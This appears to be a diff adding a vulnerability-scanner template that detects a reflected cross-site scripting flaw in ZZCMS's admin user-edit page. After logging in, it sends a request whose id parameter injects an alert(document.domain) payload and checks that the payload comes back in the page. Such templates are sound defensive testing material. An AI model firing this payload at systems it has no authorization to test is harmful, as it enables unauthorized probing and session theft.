@@ -1,0 +1,43 @@
+http:
+    - cookie-reuse: true
+      matchers:
+        - condition: and
+          dsl:
+            - contains(all_headers_2, 'text/html')
+            - status_code_2 == 200
+            - contains(body_2, "参数 1\"+alert(document.domain)+")
+          type: dsl
+      raw:
+        - |
+          POST /admin/logincheck.php HTTP/1.1
+          Host: {{Hostname}}
+          Content-Type: application/x-www-form-urlencoded
+
+          admin={{username}}&pass={{password}}
+        - |
+          GET /admin/usermodify.php?id=1%22%2balert(document.domain)%2b%22 HTTP/1.1
+          Host: {{Hostname}}
+      req-condition: true
+id: zzcms-xss
+info:
+    author: ritikchaddha
+    classification:
+        cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
+        cvss-score: 7.2
+        cwe-id: CWE-79
+    description: ZZCMS contains a cross-site scripting vulnerability. An attacker can execute arbitrary script and thus steal cookie-based authentication credentials and launch other attacks.
+    metadata:
+        max-request: 2
+        verified: true
+    name: ZZCMS - Cross-Site Scripting
+    reference:
+        - https://github.com/JcQSteven/blog/issues/20
+    severity: high
+    tags:
+        - zzcms
+        - authenticated
+        - authenticate
+        - Zcms
+        - ZZCMS
+        - ZCMS
+        - SteVe
